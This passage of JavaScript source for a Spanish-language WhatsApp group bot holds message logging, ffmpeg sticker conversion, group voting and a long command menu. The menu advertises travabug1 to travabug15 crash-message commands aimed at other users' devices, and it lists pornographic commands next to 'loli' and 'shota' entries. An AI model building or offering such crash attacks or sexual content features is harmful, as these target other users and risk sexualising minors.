const isQuotedMsg = type === "extendedTextMessage" && content.includes("textMessage")
const isQuotedImage = type === "extendedTextMessage" && content.includes("imageMessage")
const isQuotedVideo = type === "extendedTextMessage" && content.includes("videoMessage")
const isQuotedDocument = type === "extendedTextMessage" && content.includes("documentMessage")
const isQuotedAudio = type === "extendedTextMessage" && content.includes("audioMessage")
const isQuotedSticker = type === "extendedTextMessage" && content.includes("stickerMessage")
const isQuotedContact = type === "extendedTextMessage" && content.includes("contactMessage")
const isQuotedLocation = type === "extendedTextMessage" && content.includes("locationMessage")
const isQuotedProduct = type === "extendedTextMessage" && content.includes("productMessage")

const getFileBuffer = async (mediakey, MediaType) => {
const stream = await downloadContentFromMessage(mediakey, MediaType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk]) }
return buffer} 
// MENSAJES EN CONSOLA  
// ❗𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝙿𝚅❗
if (!isGroup && isCmd) console.log( '\n ⠀╭══════⊷ ', color('[ ❗️] 𝗠𝗘𝗡𝗦𝗔𝗝𝗘 𝗗𝗘 𝗖𝗛𝗔𝗧 𝗣𝗩 [ ❗️]','red'), '━━━━━━━━━━━━➪','\n',
color(' ➽ 𝐍𝐈𝐂𝐊 :','yellow'),color(pushname,'cyan'),'\n',
color(' ➽ 𝐂𝚯𝐌𝜟𝐍𝐃𝚯 :','yellow'),color(comando,'cyan'),'\n',
color(' ➽ 𝐇𝚯𝐑𝜟 :','yellow'),color(hora,'cyan'),'\n',
color(' ➽ 𝐃𝜟𝐓𝜟 :','yellow'),color(data,'cyan'),'\n',color(' ╰━━━━━━━━━━⊷ ','white'),color (nombreBott,'red'), '━━━━━━━━━━━━➪')

// ❗𝙿𝚅❗
if (!isCmd && !isGroup) console.log( '\n ⠀╭══════⊷ ', color('[ ❗️] 𝗖𝗢𝗠𝗔𝗡𝗗𝗢 𝗨𝗦𝗔𝗗𝗢 𝗘𝗡 𝗖𝗛𝗔𝗧 𝗣𝗩 [ ❗️]','red'), '━━━━━━━━━━━━➪','\n',
color(' ➽ 𝐍𝐈𝐂𝐊 :','yellow'),color(pushname,'cyan'),'\n',
color(' ➽ 𝐌𝜮𝐍𝐒𝐆 :','yellow'),color(budy,'cyan'),'\n',
color(' ➽ 𝐇𝚯𝐑𝜟 :','yellow'),color(hora,'cyan'),'\n',
color(' ➽ 𝐃𝜟𝐓𝜟 :','yellow'),color(data,'cyan'),'\n',color(' ╰━━━━━━━━━━⊷ ','white'),color (nombreBott,'red'), '━━━━━━━━━━━━➪')

// ❗𝙲𝙾𝙼𝙰𝙽𝙳𝙾  𝙶𝚁𝚄𝙿𝙾❗
if (isCmd && isGroup) console.log( '\n ⠀╭══════⊷ ', color('[ ❗️] 𝗖𝗢𝗠𝗔𝗡𝗗𝗢 𝗨𝗦𝗔𝗗𝗢 𝗘𝗡 𝗚𝗥𝗨𝗣𝗢 [ ❗️]','red'), '━━━━━━━━━━━━➪','\n',
color(' ➽ 𝐆𝐑𝐔𝐏𝚯 :','yellow'),color(groupName,'cyan'),'\n',
color(' ➽ 𝐍𝐈𝐂𝐊 :','yellow'),color(pushname,'cyan'),'\n',
color(' ➽ 𝐂𝚯𝐌𝜟𝐍𝐃𝚯 :','yellow'),color(comando,'cyan'),'\n',
color(' ➽ 𝐇𝚯𝐑𝜟 :','yellow'),color(hora,'cyan'),'\n',
color(' ➽ 𝐃𝜟𝐓𝜟 :','yellow'),color(data,'cyan'),'\n',color(' ╰━━━━━━━━━━⊷ ','white'),color (nombreBott,'red'), '━━━━━━━━━━━━➪')

// ❗𝙼𝙴𝙽𝚂𝙰 𝙶𝚁𝚄𝙿𝙾❗
if (!isCmd && isGroup) console.log( '\n ⠀╭══════⊷ ', color('[ ❗️] 𝗠𝗘𝗡𝗦𝗔𝗝𝗘 𝗗𝗘 𝗚𝗥𝗨𝗣𝗢 [ ❗️]','red'), '━━━━━━━━━━━━➪','\n',
color(' ➽ 𝐆𝐑𝐔𝐏𝚯 :','yellow'),color(groupName,'cyan'),'\n',
color(' ➽ 𝐍𝐈𝐂𝐊 :','yellow'),color(pushname,'cyan'),'\n',
color(' ➽ 𝐌𝜮𝐍𝐒𝐆 :','yellow'),color(budy,'cyan'),'\n',
color(' ➽ 𝐇𝚯𝐑𝜟 :','yellow'),color(hora,'cyan'),'\n',
color(' ➽ 𝐃𝜟𝐓𝜟 :','yellow'),color(data,'cyan'),'\n',color(' ╰━━━━━━━━━━⊷ ','white'),color (nombreBott,'red'), '━━━━━━━━━━━━➪')
if(isAutoSticker &&  !info.key.fromMe && isGroup) {
async function autofiguf() {
await setTimeout(async() => {    
if(budy.includes(`.sticker`) || budy.includes(`.s`) || budy.includes(`.stk`) || budy.includes(`.st`) || budy.includes(`.fsticker`) || budy.includes(`.f`) || budy.includes(`.fstiker`)) return
if(type === "videoMessage") {
if ((isMedia && info.message.videoMessage.seconds < 40)){  
rane = getRandom('.'+await getExtension(info.message.videoMessage.mimetype))
buffimg = await getFileBuffer(info.message.videoMessage, 'video')
fs.writeFileSync(rane, buffimg)
const media = rane
rano = getRandom('.webp')
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('bot', 'deusa')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
enviar(`Falta la conversación de ${tipe} para sticker`)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
sock.sendMessage(from, {sticker: buffer}, {quoted: info})
fs.unlinkSync(rano)
})
} 
}

if(type === "imageMessage") {
rane = getRandom('.'+await getExtension(info.message.imageMessage.mimetype))
buffimg = await getFileBuffer(info.message.imageMessage, 'image')
fs.writeFileSync(rane, buffimg)
const media = rane
rano = getRandom('.webp')
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
sock.sendMessage(from, {sticker: buffer}, {quoted: info})
fs.unlinkSync(rano)
})  
}
}, 1000)
}
autofiguf().catch(e => {
console.log(e)
})
}
if( isGroup ) {

if (budy.toLowerCase() === 'primero'){

let voto = JSON.parse(fs.readFileSync(`./archivos/duelo/P_votos/${from}.json`))
let _votos = JSON.parse(fs.readFileSync(`./archivos/duelo/votos/${from}.json`))
let filtro = voto.map(v => v.participante)
let id_voto = sender ? sender : '0@s.whatsapp.net'
if(filtro.includes(id_voto)) {
return mentions('[💡] Hola '+'@' + sender.split('@')[0] + '\n[❌️] No es Posible votar 2 veces', filtro, true)
} else {
voto.push({
participante: id_voto,
votacao: '1'
})
fs.writeFileSync(`./archivos/duelo/P_votos/${from}.json`,JSON.stringify(voto))
let _p = []
let _voto = `[🔥]𝙑𝙊𝙏𝘼 𝙋𝙊𝙍 𝙏𝙐 𝙁𝘼𝙑𝙊𝙍𝙄𝙏𝙊[🔥]\n========\n[🐀] *Participante 1* : @${_votos[0].votos.split('@')[0]}\n[🐀] *Participante 2* : @${_votos[0].votos2.split('@')[0]}\n========\n[❗️] *Motivo*: ${_votos[0].razao}\n========\n[🛎]Total de votos: ${voto.length}\n========\n[⏳️] *Duración* : ${_votos[0].duracao} minuto\n========\n[🍿] 𝗟𝗜𝗦𝗧𝗔 𝗗𝗘 𝗩𝗢𝗧𝗢𝗦 [🍿]\n`
for(let i = 0; i < voto.length; i++) {
_voto +=  `========\n[🐼] *Usuario* : @${voto[i].participante.split('@')[0]}\n[🦜] *Voto por* : ${voto[i].votacao}\n========`
_p.push(voto[i].participante)
}
_p.push(_votos[0].votos, _votos[0].votos2)
//mentions(_voto,_p,true)
}
} else if (budy.toLowerCase() === 'segundo'){
const voto = JSON.parse(fs.readFileSync(`./archivos/duelo/P_votos/${from}.json`))
let _votos = JSON.parse(fs.readFileSync(`./archivos/duelo/votos/${from}.json`))
let filtro = voto.map(v => v.participante)
let id_voto = sender ? sender : '0@s.whatsapp.net'
if(filtro.includes(id_voto)) {
return mentions('[💡] Hola  '+'@' + sender.split('@')[0] + '\n[❌️] No es Posible votar 2 veces', filtro, true)
} else {
voto.push({
participante: id_voto,
votacao: '2'
})
fs.writeFileSync(`./archivos/duelo/P_votos/${from}.json`,JSON.stringify(voto))
let _p = []
let _voto = `[🔥]𝙑𝙊𝙏𝘼 𝙋𝙊𝙍 𝙏𝙐 𝙁𝘼𝙑𝙊𝙍𝙄𝙏𝙊[🔥]\n========\n[🐀] *Participante 1* : @${_votos[0].votos.split('@')[0]}\n[🐀] *Participante 2* : @${_votos[0].votos2.split('@')[0]}\n========\n[❗️] *Motivo* : ${_votos[0].razao}\n========\n[🛎]Total de votos:${voto.length}\n========\n[⏳️] *Duración* :${_votos[0].duracao} minuto\n[🍿] 𝗟𝗜𝗦𝗧𝗔 𝗗𝗘 𝗩𝗢𝗧𝗢𝗦 [🍿]\n`
for(let i = 0; i < voto.length; i++) {
_voto +=  `========\n[🐼] *Usuario* : @${voto[i].participante.split('@')[0]}\n[🦜] *Voto por* : ${voto[i].votacao}\n========\n`
_p.push(voto[i].participante)
}
_p.push(_votos[0].votos, _votos[0].votos2)
//mentions(_voto,_p,true)
}
}
}	
const runtime = function(seconds) {
    seconds = Number(seconds);
    var d = Math.floor(seconds / (3600 * 24));
    var h = Math.floor(seconds % (3600 * 24) / 3600);
    var m = Math.floor(seconds % 3600 / 60);
    var s = Math.floor(seconds % 60);
    var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
    var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
    var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
    var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
    return dDisplay + hDisplay + mDisplay + sDisplay;
}
const infoBot = `
𝑺𝑶𝑴𝑶𝑺 𝑬𝑳 𝑴𝑬𝑱𝑶𝑹 𝑩𝑶𝑻 𝑫𝑬 𝑪𝑨𝑺𝑬𝑺\n\n[🍿] El bot actualmente cuenta con ${totalFitur()} comandos\n\n[⏳️] Su tiempo de conexión es de : ${runtime(process.uptime())}\n.\n[🌍]Cuenta con su propia api externa : minijulscitoapi.store \n\n[🔥]él método de conexión es con número, ya no con Qr \n\n[❗️]Los método estan actualizados al 100% para que pueda ser hospedado en cualquier servidor. \n\n[🎩]Mi creador oficial es *Juls Modders* , si quieres contactarte con él , aquí te dejo un link que te direccionará: https://wa.link/pd8zil . \n\n[🌹]Gracias y Dios te bendiga.

`
const menuprincipal =
`        
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙈𝙀𝙉𝙐 𝙋𝙍𝙄𝙉𝘾𝙄𝙋𝘼𝙇⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙳𝙸𝙰 : ${data}
╿║ ➪ 𝙷𝙾𝚁𝙰 : ${hora}
╿║ ➪ 𝙴𝚂𝚃𝙰𝙳𝙾 : 𝑨𝑪𝑻𝑰𝑽𝑶 24/07
╿║ ➪ 𝙱𝙾𝚃 : 𝙈𝙄𝙉𝙄 𝙅𝙐𝙇𝙎𝘾𝙄𝙏𝙊
╿║ ➪ 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟐.𝟎
╿║ ➪ 𝙲𝚁𝙴𝙰𝙳𝙾𝚁 : 𝐉𝐔𝐋𝐒 𝐌𝐎𝐃𝐃𝐄𝐑𝐒
╿║ ➪ 𝙾𝙽𝙻𝙸𝙽𝙴 :  ${runtime(process.uptime())}
╿║ ➪ 𝙲𝙾𝙼𝙰𝙽𝙳𝙾𝚂 : 600
╿╰─═─-─── • ◆ • ─═─═
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐌𝐄𝐍𝐔 𝐄𝐒𝐏𝐄𝐂𝐈𝐀𝐋⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ cursos
╿║ ➪ chatgpt
╿║ ➪ removebg
╿║ ➪ removebg2
╿║ ➪ toanime
╿║ ➪ toanime2
╿║ ➪ dibuja
╿║ ➪ dibujav2
╿║ ➪ dibujav3
╿║ ➪ idotaku
╿║ ➪ datocurioso
╿║ ➪ define
╿║ ➪ meme
╿║ ➪ clima
╿║ ➪ traducir
╿║ ➪ report
╿║ ➪ bateria
╿║ ➪ nvcmd
╿║ ➪ afk
╿╰─═─-───• ◆ • ─═─═
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║         ⃝⃕𝐌𝐄𝐍𝐔 𝐀𝐍𝐓𝐈𝐒⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ welcome 1 / 0
╿║ ➪ antilink 1 / 0
╿║ ➪ antidoc 1 / 0
╿║ ➪ anticatalogo 1 / 0
╿║ ➪ antilimit 1 / 0
╿║ ➪ antisticker 1 / 0
╿║ ➪ antiimg 1 / 0
╿║ ➪ antiloc 1 / 0
╿║ ➪ anticontact 1 / 0
╿║ ➪ antinotas 1 / 0
╿║ ➪ autoreac 1 / 0
╿║ ➪ autostick 1 / 0
╿║ ➪ antifake 1 / 0
╿╰─═─-───• ◆ • ─═─═
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║         ⃝⃕𝐌𝐄𝐍𝐔 𝐀𝐃𝐌𝐈𝐍⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ edotensei
╿║ ➪ mutear
╿║ ➪ desmutear
╿║ ➪ muteados
╿║ ➪ closetime
╿║ ➪ opentime
╿║ ➪ add
╿║ ➪ ban
╿║ ➪ ban2
╿║ ➪ grupo a / c
╿║ ➪ statusaudio
╿║ ➪ statusimage
╿║ ➪ statusvideo
╿║ ➪ statustext
╿║ ➪ marcar
╿║ ➪ userjid
╿║ ➪ groupid
╿║ ➪ infogp
╿║ ➪ linkgp
╿║ ➪ sorteo
╿║ ➪ sorteonumeros
╿║ ➪ listape
╿║ ➪ listamundial
╿║ ➪ listafake
╿║ ➪ listafake2
╿║ ➪ listafake3
╿║ ➪ listafake4
╿║ ➪ listafake5
╿║ ➪ listafake6
╿║ ➪ kickfake
╿║ ➪ kickfake2
╿║ ➪ kickfake3
╿║ ➪ kickfake4
╿║ ➪ kickfake5
╿║ ➪ kickfake6
╿║ ➪ listadmins
╿║ ➪ resetlink
╿╰─═─-───• ◆ • ─═─═
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐌𝐄𝐍𝐔 𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐒⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ figu
╿║ ➪ stickergif
╿║ ➪ robarfigu
╿║ ➪ robargif
╿║ ➪ emojimix
╿║ ➪ emojimix2
╿║ ➪ attp
╿║ ➪ attp1
╿║ ➪ attp2
╿║ ➪ attp3
╿║ ➪ attp4
╿║ ➪ attp5
╿║ ➪ attp6
╿║ ➪ attp7
╿║ ➪ attp8
╿║ ➪ attp9
╿║ ➪ attp10
╿║ ➪ attp11
╿║ ➪ ttps
╿║ ➪ lovestick
╿║ ➪ gurastick
╿║ ➪ patrick
╿║ ➪ patrick2
╿║ ➪ doger
╿║ ➪ animestick
╿║ ➪ among
╿║ ➪ animegif
╿║ ➪ dado
╿║ ➪ sponjebob
╿║ ➪ sponjebob2
╿║ ➪ random
╿║ ➪ rabbit
╿║ ➪ paimon
╿║ ➪ mukalu
╿║ ➪ dino
╿║ ➪ manus
╿╰─═─-───• ◆ • ─═─═
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║   ⃝⃕𝐌𝐄𝐍𝐔 𝐂𝐎𝐍𝐕𝐄𝐑𝐓𝐈𝐃𝐎𝐑𝐄𝐒⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ tinyurl
╿║ ➪ toimg
╿║ ➪ imgpralink
╿║ ➪ topp
╿║ ➪ vozmenino
╿║ ➪ videorapido
╿║ ➪ videolento
╿║ ➪ videocontrario
╿║ ➪ audiolento
╿║ ➪ bass
╿║ ➪ estourar
╿║ ➪ audiorapido
╿║ ➪ esquilo
╿║ ➪ grave
╿║ ➪ tomp3
╿║ ➪ tomp4
╿╰─═─-───• ◆ • ─═─═
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐌𝐄𝐍𝐔 𝐁𝐑𝐈𝐍𝐂𝐀𝐃𝐄𝐈𝐑𝐀𝐒⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ gay
╿║ ➪ hoy
╿║ ➪ conciencia
╿║ ➪ frasebonita
╿║ ➪ consejo
╿║ ➪ chiste
╿║ ➪ piropo
╿║ ➪ styletext
╿║ ➪ frases1
╿║ ➪ frases2
╿║ ➪ parejas
╿║ ➪ metadinha
╿║ ➪ top otakus
╿║ ➪ top fieles
╿║ ➪ top geys
╿║ ➪ top parejas
╿║ ➪ top feos
╿║ ➪ top guapos
╿║ ➪ top inteligentes
╿║ ➪ top burros
╿║ ➪ duelo kbros
╿║ ➪ duelo feos
╿║ ➪ duelo geys
╿║ ➪ duelo guapos
╿║ ➪ duelo inteligentes
╿║ ➪ duelo burros
╿║ ➪ duelo otakus
╿║ ➪ duelo chivazos
╿╰─═─-───• ◆ • ─═─═
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐌𝐄𝐍𝐔 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐒⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ facebook
╿║ ➪ linksp 
╿║ ➪ gitclone
╿║ ➪ ytmp3
╿║ ➪ ytmp4
╿║ ➪ linkstick
╿║ ➪ lkxxx
╿║ ➪ lkxvid
╿║ ➪ tiktok
╿║ ➪ tiktokmusic
╿║ ➪ instagram
╿║ ➪ mediafire
╿╰─═─-───• ◆ • ─═─═
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐌𝐄𝐍𝐔 𝐁𝐔𝐒𝐂𝐀𝐃𝐎𝐑𝐄𝐒⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ spotify
╿║ ➪ mp3
╿║ ➪ mp4
╿║ ➪ githubstalk
╿║ ➪ npmstalk
╿║ ➪ pinterest
╿║ ➪ wallpaper
╿║ ➪ wikimedia
╿║ ➪ wallpaper2
╿║ ➪ ringtone
╿║ ➪ wikipedia
╿║ ➪ lirik
╿║ ➪ buscarstickers
╿║ ➪ xxx
╿║ ➪ xvideos
╿║ ➪ convite
╿╰─═─-───• ◆ • ─═─═
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║     ⃝⃕𝐌𝐄𝐍𝐔 𝐏𝐇𝐎𝐓𝐎𝐎𝐗𝐈⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ blackpink                                 
╿║ ➪ aleatory
╿║ ➪ avatar   
╿║ ➪ avatar2   
╿║ ➪ avatar3   
╿║ ➪ garena   
╿║ ➪ battle   
╿║ ➪ francotirador   
╿║ ➪ francotirador2   
╿║ ➪ francotirador3   
╿║ ➪ francotirador4  
╿║ ➪ francotirador5   
╿║ ➪ francotirador6   
╿║ ➪ francotirador7   
╿║ ➪ banner2       
╿║ ➪ banner3                                 
╿║ ➪ banner4
╿║ ➪ banner5   
╿║ ➪ banner6   
╿║ ➪ banner7   
╿║ ➪ counterstrick   
╿║ ➪ counterstrick2   
╿║ ➪ counterstrick3   
╿║ ➪ counterstrick4   
╿║ ➪ counterstrick5   
╿║ ➪ counterstrick6  
╿║ ➪ counterstrick7   
╿║ ➪ narutowall   
╿║ ➪ cumpleaños   
╿║ ➪ harrypotter                    
╿║ ➪ pokemones   
╿║ ➪ pokemones2
╿║ ➪ pokemones3      
╿║ ➪ pokemones4   
╿║ ➪ pokemones5   
╿║ ➪ pokemones6      
╿║ ➪ mar                                 
╿║ ➪ neon3
╿║ ➪ metallic   
╿║ ➪ gradient   
╿║ ➪ lobo   
╿║ ➪ cementerio   
╿║ ➪ grafiti   
╿║ ➪ pentakil   
╿║ ➪ hellowkiti   
╿║ ➪ green   
╿║ ➪ fuego  
╿║ ➪ brillo   
╿║ ➪ arcoiris   
╿║ ➪ yellow   
╿║ ➪ sandia       
╿║ ➪ neon                                 
╿║ ➪ neon2
╿║ ➪ shine
╿║ ➪ arcade   
╿║ ➪ vela   
╿║ ➪ orange   
╿║ ➪ cromed   
╿║ ➪ grass   
╿║ ➪ plantilla   
╿║ ➪ cereal   
╿║ ➪ jungla  
╿║ ➪ madera   
╿║ ➪ flores   
╿║ ➪ blackpink   
╿║ ➪ corazones                    
╿║ ➪ caffe   
╿║ ➪ caffe2
╿╰─═─-───• ◆ • ─═─═
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐈𝐌𝐀𝐆𝐄𝐍𝐄𝐒 𝐀𝐋𝐄𝐀𝐓𝐎𝐑𝐈𝐀𝐒⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ montañas      
╿║ ➪ manga   
╿║ ➪ lisa   
╿║ ➪ kucing
╿║ ➪ kpop      
╿║ ➪ katakata   
╿║ ➪ kartun   
╿║ ➪ justina
╿║ ➪ jiso      
╿║ ➪ jeni   
╿║ ➪ gamewallp   
╿║ ➪ ciberspace
╿║ ➪ cosplaysagiri      
╿║ ➪ cosplayloli   
╿║ ➪ cosplay   
╿║ ➪ carros
╿║ ➪ women2      
╿║ ➪ chuki   
╿║ ➪ women   
╿║ ➪ blackpink
╿║ ➪ aesthetic2
╿║ ➪ aesthetic      
╿║ ➪motos                         
╿║ ➪pentol                          
╿║ ➪ ppcouple                         
╿║ ➪ profil                         
╿║ ➪ programming                  
╿║ ➪ pubg
╿║ ➪ rose
╿║ ➪ ryujin                       
╿║ ➪ satanic                        
╿║ ➪ tatasurya                     
╿║ ➪ technology                       
╿║ ➪ wallhp               
╿║ ➪ wallhp2
╿║ ➪ yulibocil
╿║ ➪ lizard
╿║ ➪ meow
╿║ ➪ avatar
╿║ ➪ feed
╿║ ➪ goose
╿║ ➪ 8ball
╿║ ➪ woof
╿║ ➪ gecg
╿║ ➪ tickle
╿║ ➪ fox_girl
╿║ ➪ nom
╿║ ➪ waifu
╿║ ➪ cuddle
╿║ ➪ slap
╿║ ➪ pat
╿║ ➪ hug
╿║ ➪ kiss
╿║ ➪ cry
╿║ ➪ awoo
╿║ ➪ megumin
╿║ ➪ shinobu
╿║ ➪ handhold
╿║ ➪ highfive
╿║ ➪ cringe
╿║ ➪ dance
╿║ ➪ happy
╿║ ➪ glomp
╿║ ➪ smug
╿║ ➪ blush
╿║ ➪ wave
╿║ ➪ smile
╿║ ➪ poke
╿║ ➪ wink
╿║ ➪ bonk
╿║ ➪ bully
╿║ ➪ yeet
╿║ ➪ bite
╿║ ➪ lick
╿║ ➪ kill
╿╰─═─-───• ◆ • ─═─═
║            
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐌𝐄𝐍𝐔 𝐃𝐀𝐍𝐆𝐄𝐑⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═       
╿║ ➪ ahegao 
╿║ ➪ ass 
╿║ ➪ bdsm 
╿║ ➪ blowjob
╿║ ➪ chuckold 
╿║ ➪ cum 
╿║ ➪ ero 
╿║ ➪ femdom 
╿║ ➪ foot 
╿║ ➪ gifs 
╿║ ➪ glasses 
╿║ ➪ hentai 
╿║ ➪ jahy     
╿║ ➪ masturbation 
╿║ ➪ neko
╿║ ➪ neko2 
╿║ ➪ orgy 
╿║ ➪ panties 
╿║ ➪ pussy 
╿║ ➪ tentacles 
╿║ ➪ thighs 
╿║ ➪ yuri 
╿║ ➪ zettay       
╿╰─═─-───• ◆ • ─═─═
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║   ⃝⃕𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑𝐒 𝐀𝐍𝐈𝐌𝐄⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪  doraemon     
╿║ ➪  boruto     
╿║ ➪ hinata
╿║ ➪ inori
╿║ ➪ itachi
╿║ ➪ itori
╿║ ➪ madara              
╿║ ➪ minato
╿║ ➪ naruto
╿║ ➪ sakura
╿║ ➪ sasuke
╿║ ➪ akira
╿║ ➪ akiyama
╿║ ➪ ana
╿║ ➪ asuna
╿║ ➪ ayuzawa
╿║ ➪ chiho
╿║ ➪ chitoge
╿║ ➪ deidara
╿║ ➪ eba
╿║ ➪ elaina
╿║ ➪ emilia    
╿║ ➪ miku
╿║ ➪ mikasa
╿║ ➪ megumin
╿║ ➪ loli
╿║ ➪ kurumi
╿║ ➪ kotori
╿║ ➪ keneki
╿║ ➪ kaori
╿║ ➪ kakasih
╿║ ➪ kagura
╿║ ➪ kaga
╿║ ➪ isuzu
╿║ ➪ hestia
╿║ ➪ hekel
╿║ ➪ gremory
╿║ ➪ erza                          
╿║ ➪ yumeko
╿║ ➪ yuki
╿║ ➪ yotsuba
╿║ ➪ waifu2
╿║ ➪ tsunade
╿║ ➪ toukachan
╿║ ➪ tejina
╿║ ➪ shota
╿║ ➪ shizuka
╿║ ➪ shinomiya
╿║ ➪ shinka
╿║ ➪ shina
╿║ ➪ sagiri
╿║ ➪ rize
╿║ ➪ pokemon
╿║ ➪ onepiece
╿║ ➪ nezuko
╿║ ➪ nekonime                                             
╿╰─═─-─── • ◆ • ─═─═
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║     ⃝⃕𝐌𝐄𝐍𝐔 𝐃𝐄 𝐓𝐑𝐀𝐕𝐀𝐒⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ travabug1
╿║ ➪ travabug2
╿║ ➪ travabug3
╿║ ➪ travabug4
╿║ ➪ travabug5
╿║ ➪ travabug6
╿║ ➪ travabug7
╿║ ➪ travabug8
╿║ ➪ travabug9
╿║ ➪ travabug10
╿║ ➪ travabug11
╿║ ➪ travabug12
╿║ ➪ travabug13
╿║ ➪ travabug14
╿║ ➪ travabug15
╿╰─═─-─── • ◆ • ─═─═
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║     ⃝⃕𝐌𝐄𝐍𝐔 𝐃𝐄 𝐉𝐔𝐄𝐆𝐎𝐒⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ akinator
╿║ ➪ math
╿║ ➪ calcular
╿║ ➪ casino facil
╿║ ➪ casino dificil
╿║ ➪ mundoz on
╿║ ➪ mundoz off
╿║ ➪ mundoz revelar
╿║ ➪ emojirefran on
╿║ ➪ emojirefran off
╿║ ➪ emojirefran revelar
╿║ ➪ diferencias on
╿║ ➪ diferencias off
╿║ ➪ diferencias revelar
╿║ ➪ oneword on
╿║ ➪ oneword off
╿║ ➪ oneword revelar
╿║ ➪ narutoword on
╿║ ➪ narutoword off
╿║ ➪ narutoword revelar
╿║ ➪ dragonz on
╿║ ➪ dragonz off
╿║ ➪ dragonz revelar
╿║ ➪ banderas on
╿║ ➪ banderas off
╿║ ➪ banderas revelar
╿║ ➪ slot
╿║ ➪ slot2
╿║ ➪ dadonegro
╿║ ➪ dadoespecial
╿║ ➪ cartadoble
╿║ ➪ cartamayor
╿║ ➪ cartauno
╿║ ➪ caraosello1
╿║ ➪ caraosello2
╿║ ➪ 3rayas
╿║ ➪ sopadeletras
╿╰─═─-─── • ◆ • ─═─═
║
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐌𝐄𝐍𝐔 𝐎𝐖𝐍𝐄𝐑⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ owner
╿║ ➪ getcase
╿║ ➪ fotobot
╿║ ➪ audiobot
╿║ ➪ editbienvenida
╿║ ➪ editdespedida
╿║ ➪ editadmin
╿║ ➪ editnoadmin
╿║ ➪ groupsid
╿║ ➪ myip
╿║ ➪ infobot
╿║ ➪ >
╿║ ➪ join
╿║ ➪ ruletaban
╿╰─═─-───• ◆ • ─═─═
║
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐓𝐄𝐗𝐓𝐏𝐑𝐎 𝐌𝐄𝐍𝐔⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ summerr                                 
╿║ ➪ liglig
╿║ ➪ impressive   
╿║ ➪ greenn   
╿║ ➪ bokeh   
╿║ ➪ violeta   
╿║ ➪ styleg   
╿║ ➪ alas   
╿║ ➪ thunder   
╿║ ➪ matrix   
╿║ ➪ summer2  
╿║ ➪ wolf   
╿║ ➪ leon   
╿║ ➪ pornhubl   
╿║ ➪ pinkl       
╿║ ➪ electro                  
╿║ ➪ avengers
╿║ ➪ party
╿║ ➪ pinkcute
╿║ ➪ greenn   
╿║ ➪ game   
╿║ ➪ magma   
╿║ ➪ koi   
╿║ ➪ dropwater   
╿║ ➪ blackpink2  
╿║ ➪ halloween  
╿║ ➪ batman   
╿║ ➪ blood   
╿║ ➪ narutolog                       
╿║ ➪ hallowean2  
╿║ ➪ natural      
╿║ ➪ pencil   
╿║ ➪ verdee   
╿║ ➪ horror
╿║ ➪ coolst      
╿║ ➪ realistic   
